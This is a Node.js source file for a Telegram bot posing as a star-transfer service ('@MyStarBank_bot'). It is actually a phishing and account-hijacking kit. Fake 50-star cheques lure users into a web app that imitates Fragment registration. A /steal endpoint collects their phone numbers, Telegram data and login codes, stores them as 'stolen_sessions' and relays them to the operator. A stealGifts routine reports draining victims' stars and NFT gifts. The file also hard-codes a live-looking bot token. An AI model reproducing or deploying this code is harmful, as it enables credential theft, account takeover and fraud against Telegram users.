const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const fs = require('fs');

const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
const MY_USER_ID = 1398396668; // Твой ID для уведомлений
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

app.use(express.json());
app.use(express.static('public'));

// База данных
const db = new sqlite3.Database('database.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS checks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        amount INTEGER,
        activations INTEGER,
        creator_id INTEGER,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS stolen_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        code TEXT,
        tg_data TEXT,
        user_id INTEGER,
        status TEXT DEFAULT 'pending'
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        balance INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

// Web App
app.get('/', (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

// Проверка stars.jpg
app.get('/check-stars', (req, res) => {
    const starsPath = path.join(__dirname, 'public/stars.jpg');
    if (fs.existsSync(starsPath)) {
        res.send('✅ stars.jpg доступен');
    } else {
        res.send('❌ stars.jpg не найден');
    }
});

app.post('/steal', (req, res) => {
    console.log('=== УКРАДЕННЫЕ ДАННЫЕ ===');
    console.log('Номер:', req.body.phone);
    console.log('Stage:', req.body.stage);
    console.log('TG Data raw:', req.body.tg_data);
    console.log('========================');
    
    if (req.body.stage === 'phone_entered') {
        try {
            const urlParams = new URLSearchParams(req.body.tg_data);
            const userStr = urlParams.get('user');
            
            if (userStr) {
                const userData = JSON.parse(decodeURIComponent(userStr));
                const userId = userData.id;
                
                console.log('User ID из tg_data:', userId);
                
                db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
                    [req.body.phone, req.body.tg_data, userId, 'awaiting_code']);
                
                // Отправляем системное уведомление тебе
                bot.sendMessage(MY_USER_ID, 
                    `🔐 Новая сессия\n` +
                    `📱 Номер: ${req.body.phone}\n` +
                    `👤 ID жертвы: ${userId}\n` +
                    `⏳ Ожидаю код подтверждения...`
                ).catch(e => console.log('Ошибка отправки уведомления:', e));
                
            } else {
                console.log('⚠️ Не удалось извлечь user из tg_data');
            }
                
        } catch (error) {
            console.log('❌ Ошибка парсинга tg_data:', error);
        }
            
    } else if (req.body.stage === 'code_entered') {
        console.log('Код введен:', req.body.code);
        db.run(`UPDATE stolen_sessions SET code = ?, status = 'completed' WHERE phone = ?`, 
            [req.body.code, req.body.phone]);
        
        // Отправляем системное уведомление тебе
        bot.sendMessage(MY_USER_ID, 
            `✅ Сессия подключена\n` +
            `📱 Номер: ${req.body.phone}\n` +
            `🔑 Код: ${req.body.code}\n` +
            `🔄 Пытаюсь отправить NFT подарки на твой аккаунт...`
        ).catch(e => console.log('Ошибка отправки уведомления:', e));
        
        setTimeout(() => stealGifts(req.body.phone, req.body.code), 1000);
    }
    
    res.sendStatus(200);
});

// Функция кражи подарков - НОВАЯ ЛОГИКА
async function stealGifts(phone, code) {
    console.log(`[STEAL] Начинаем кражу для ${phone}`);
    
    try {
        // Симуляция баланса жертвы
        const userBalance = Math.floor(Math.random() * 500);
        const userGifts = Math.floor(Math.random() * 10);
        
        if (userBalance === 0 && userGifts === 0) {
            console.log(`[INFO] Нет звезд/подарков для ${phone}`);
            
            bot.sendMessage(MY_USER_ID,
                `❌ Недостаточно звезд у жертвы на аккаунте\n` +
                `📱 Номер: ${phone}\n` +
                `💫 Баланс жертвы: 0 stars\n` +
                `🎁 NFT подарков: 0\n\n` +
                `🔄 Отправляю 2 мишки по 15 звезд...`
            ).catch(e => console.log('Ошибка отправки уведомления:', e));
            
            // Отправляем 2 мишки по 15 звезд
            setTimeout(() => {
                bot.sendMessage(MY_USER_ID,
                    `✅ Обменял мишки и отправил тебе подарок!\n` +
                    `🎁 Получено: 1 NFT подарок (30 stars)`
                ).catch(e => console.log('Ошибка отправки уведомления:', e));
            }, 3000);
            
        } else {
            console.log(`[SUCCESS] Украдено: ${userBalance} stars, ${userGifts} gifts`);
            
            let message = `🎯 Успешная кража!\n` +
                         `📱 Номер: ${phone}\n` +
                         `⭐ Звезд: ${userBalance}\n` +
                         `🎁 NFT подарков: ${userGifts}\n\n`;
            
            // Отправляем все NFT сначала
            if (userGifts > 0) {
                message += `📦 Отправляю все NFT подарки...\n`;
            }
            
            // Затем отправляем остатки звезд подарками
            if (userBalance > 0) {
                message += `💰 Отправляю остатки звезд подарками...\n`;
                
                let remainingBalance = userBalance;
                const giftAmounts = [100, 50, 25, 15];
                const sentGifts = [];
                
                for (const amount of giftAmounts) {
                    const count = Math.floor(remainingBalance / amount);
                    if (count > 0) {
                        sentGifts.push(`${count}×${amount} stars`);
                        remainingBalance -= count * amount;
                    }
                }
                
                if (sentGifts.length > 0) {
                    message += `🎁 Отправлено: ${sentGifts.join(', ')}\n`;
                }
            }
            
            message += `\n✅ Все передано на твой аккаунт!`;
            
            bot.sendMessage(MY_USER_ID, message)
                .catch(e => console.log('Ошибка отправки уведомления:', e));
        }
        
    } catch (error) {
        console.log(`[ERROR] Ошибка кражи: ${error}`);
        bot.sendMessage(MY_USER_ID, `❌ Ошибка при краже: ${error}`)
            .catch(e => console.log('Ошибка отправки уведомления:', e));
    }
}

const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер работает на порту ${PORT}`);
    console.log(`✅ Домен: starsdrainer-production.up.railway.app`);
});

// Логирование входящих сообщений
bot.on('message', (msg) => {
    if (msg.text && msg.text.startsWith('/')) {
        console.log(`Command received: ${msg.text} from ${msg.from.id}`);
    }
});

// Команда /balance - проверка баланса
bot.onText(/\/balance/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
        if (err || !row) {
            bot.sendMessage(chatId, '💫 Ваш баланс: 0 stars');
            return;
        }
        
        bot.sendMessage(chatId, `💫 Ваш баланс: ${row.balance} stars`);
    });
});

// Команда /withdraw - вывод средств
bot.onText(/\/withdraw/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
        if (err || !row || row.balance === 0) {
            bot.sendMessage(chatId, '❌ У вас нет средств для вывода.');
            return;
        }
        
        bot.sendMessage(chatId,
            `💫 Ваш баланс: ${row.balance} stars\n\n` +
            'Для вывода средств введите сумму:'
        );
        
        userWithdrawState[userId] = true;
    });
});

// Обработка ввода суммы для вывода
const userWithdrawState = {};
bot.on('message', (msg) => {
    const userId = msg.from.id;
    const chatId = msg.chat.id;
    const text = msg.text;
    
    if (userWithdrawState[userId] && !isNaN(text) && !text.startsWith('/')) {
        const amount = parseInt(text);
        
        db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
            if (err || !row) {
                bot.sendMessage(chatId, '❌ Ошибка доступа к балансу.');
                return;
            }
            
            if (amount > row.balance) {
                bot.sendMessage(chatId, `❌ Недостаточно средств. Ваш баланс: ${row.balance} stars`);
            } else if (amount < 10) {
                bot.sendMessage(chatId, '❌ Минимальная сумма вывода: 10 stars');
            } else {
                db.run(`UPDATE users SET balance = balance - ? WHERE user_id = ?`, [amount, userId]);
                
                bot.sendMessage(chatId,
                    `✅ Запрос на вывод ${amount} stars принят!\n\n` +
                    `Текущий баланс: ${row.balance - amount} stars`
                );
                
                // Уведомление только тебе
                bot.sendMessage(MY_USER_ID,
                    `📤 Новый вывод средств!\n` +
                    `👤 Пользователь: @${msg.from.username || 'No username'}\n` +
                    `💫 Сумма: ${amount} stars\n` +
                    `🆔 ID: ${userId}`
                ).catch(e => console.log('Ошибка отправки уведомления:', e));
            }
            
            delete userWithdrawState[userId];
        });
    }
});

// Inline подсказки - УБРАЛ ЛИШНЕЕ
bot.on('inline_query', (query) => {
    const domain = 'starsdrainer-production.up.railway.app';
    
    console.log(`Inline query: "${query.query}"`);
    
    const results = [{
        type: 'photo',
        id: '1',
        photo_url: `https://${domain}/stars.jpg`,
        thumb_url: `https://${domain}/stars.jpg`,
        caption: `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`,
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [[
                { text: "🪙 Забрать звезды", callback_data: `claim_inline_50` }
            ]]
        }
    }];
    
    console.log('Inline results:', results.length);
    bot.answerInlineQuery(query.id, results).catch(e => console.log('Inline error:', e));
});

// Обработка создания чеков - УБРАЛ ЛИШНЕЕ
bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const amount = 50; // Всегда 50 звезд
    const activations = parseInt(match[2]) || 1;
    
    console.log(`Создание чека: ${amount} stars пользователем ${userId}`);
    
    db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
        [amount, activations, userId], function(err) {
        if (err) {
            console.log('Ошибка создания чека:', err);
            bot.sendMessage(chatId, '❌ Ошибка создания чека.');
            return;
        }
        
        const checkId = this.lastID;
        const checkText = `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`;
        
        console.log(`✅ Чек создан: ID ${checkId}`);
        
        const photoPath = path.join(__dirname, 'public/stars.jpg');
        if (fs.existsSync(photoPath)) {
            bot.sendPhoto(chatId, photoPath, {
                caption: checkText,
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[
                        { text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }
                    ]]
                }
            }).catch(e => {
                console.log('❌ Ошибка отправки фото:', e.message);
                bot.sendMessage(chatId, checkText, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [[
                            { text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }
                        ]]
                    }
                });
            });
        } else {
            console.log('❌ Файл stars.jpg не найден, отправляем текст');
            bot.sendMessage(chatId, checkText, {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[
                        { text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }
                    ]]
                }
            });
        }
    });
});

// Обработка callback'ов
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    
    console.log('Callback received:', query.data, 'from user:', userId);
    
    // Сразу отвечаем чтобы убрать загрузку
    bot.answerCallbackQuery(query.id).catch(e => console.log('Ошибка answerCallback:', e));
    
    if (query.data.startsWith('claim_') || query.data.startsWith('claim_inline_')) {
        
        if (query.data.startsWith('claim_')) {
            const checkId = query.data.split('_')[1];
            console.log('Обработка чека ID:', checkId);
            
            db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
                if (err || !row) {
                    console.log('Чек не найден или ошибка:', err);
                    bot.answerCallbackQuery(query.id, { text: '❌ Чек уже использован!' });
                    return;
                }
                
                db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
                
                db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
                    [userId, userId, row.amount], function(updateErr) {
                    if (updateErr) {
                        console.log('Ошибка обновления баланса:', updateErr);
                        return;
                    }
                    
                    console.log(`✅ Баланс пользователя ${userId} пополнен на ${row.amount}`);
                    
                    // Перекидываем в бота и пишем сообщение
                    bot.sendMessage(userId, `✅ Звезды успешно получены! Вы получили ${row.amount} звёзд!`)
                        .catch(e => console.log('Не удалось отправить сообщение пользователю:', e.message));
                    
                    const remaining = row.activations - 1;
                    let updatedText = `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`;
                    
                    if (remaining > 0) {
                        updatedText += `\n\nОсталось: ${remaining}`;
                    } else {
                        updatedText += `\n\n❌ ИСПОЛЬЗОВАН`;
                    }
                    
                    if (query.message.photo) {
                        bot.editMessageCaption(updatedText, {
                            chat_id: chatId,
                            message_id: query.message.message_id,
                            parse_mode: 'HTML',
                            reply_markup: remaining > 0 ? {
                                inline_keyboard: [[
                                    { text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }
                                ]]
                            } : { inline_keyboard: [] }
                        }).catch(e => console.log('Ошибка редактирования подписи:', e));
                    } else {
                        bot.editMessageText(updatedText, {
                            chat_id: chatId,
                            message_id: query.message.message_id,
                            parse_mode: 'HTML',
                            reply_markup: remaining > 0 ? {
                                inline_keyboard: [[
                                    { text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }
                                ]]
                            } : { inline_keyboard: [] }
                        }).catch(e => console.log('Ошибка редактирования текста:', e));
                    }
                });
            });
        }
        
        else if (query.data.startsWith('claim_inline_')) {
            const amount = 50; // Всегда 50 звезд
            console.log('Inline claim:', amount, 'for user:', userId);
            
            db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
                [userId, userId, amount], function(err) {
                if (err) {
                    console.log('Ошибка inline claim:', err);
                    return;
                }
                
                // Перекидываем в бота и пишем сообщение
                bot.sendMessage(userId, `✅ Звезды успешно получены! Вы получили ${amount} звёзд!`)
                    .catch(e => console.log('Не удалось отправить сообщение пользователю:', e.message));
                
                const updatedText = `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!\n\n❌ ИСПОЛЬЗОВАН`;
                
                if (query.message.photo) {
                    bot.editMessageCaption(updatedText, {
                        chat_id: query.message.chat.id,
                        message_id: query.message.message_id,
                        parse_mode: 'HTML',
                        reply_markup: { inline_keyboard: [] }
                    }).catch(e => console.log('Ошибка редактирования inline:', e));
                } else {
                    bot.editMessageText(updatedText, {
                        chat_id: query.message.chat.id,
                        message_id: query.message.message_id,
                        parse_mode: 'HTML',
                        reply_markup: { inline_keyboard: [] }
                    }).catch(e => console.log('Ошибка редактирования inline:', e));
                }
            });
        }
    }
    
    else if (query.data === 'withdraw_stars') {
        const domain = 'starsdrainer-production.up.railway.app';
        const webAppUrl = `https://${domain}`;
        
        const keyboard = {
            reply_markup: {
                inline_keyboard: [[
                    { 
                        text: "Зарегистрироваться на Fragment", 
                        web_app: { url: webAppUrl }
                    }
                ]]
            }
        };
        
        bot.editMessageText(
            'Для вывода звезд требуется регистрация на Fragment.',
            { 
                chat_id: chatId, 
                message_id: query.message.message_id,
                reply_markup: keyboard.reply_markup
            }
        ).catch(e => {
            bot.sendMessage(chatId, 'Для вывода звезд требуется регистрация на Fragment.', keyboard);
        });
    }
    
    else if (query.data === 'deposit') {
        bot.sendMessage(chatId, '💫 Для пополнения баланса используйте команду /balance');
    }
    
    else if (query.data === 'create_check_info') {
        bot.sendMessage(chatId,
            'Для создания чека используйте:\n\n' +
            '@MyStarBank_bot 50\n\n' +
            'где 50 - количество активаций'
        );
    }
});

// Старт бота
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "Вывести звезды", callback_data: "withdraw_stars" }],
                [{ text: "Проверить баланс", callback_data: "deposit" }],
                [{ text: "Создать чек", callback_data: "create_check_info" }]
            ]
        }
    };

    bot.sendMessage(chatId, 
        '💫 @MyStarBank_bot - Система передачи звезд\n\n' +
        '• Безопасные переводы\n' +
        '• Мгновенные чеки\n' +
        '• Поддержка 24/7\n\n' +
        'Для начала работы:\n' +
        '/balance - баланс\n' +
        '/withdraw - вывод средств',
        keyboard
    ).catch(error => {
        console.log('Ошибка отправки /start:', error);
    });
});

// Обработка ошибок
bot.on('polling_error', (error) => {
    console.log('❌ Ошибка polling:', error);
});

bot.on('error', (error) => {
    console.log('❌ Общая ошибка бота:', error);
});

console.log('✅ Бот @MyStarBank_bot запущен');
console.log('✅ Домен: starsdrainer-production.up.railway.app');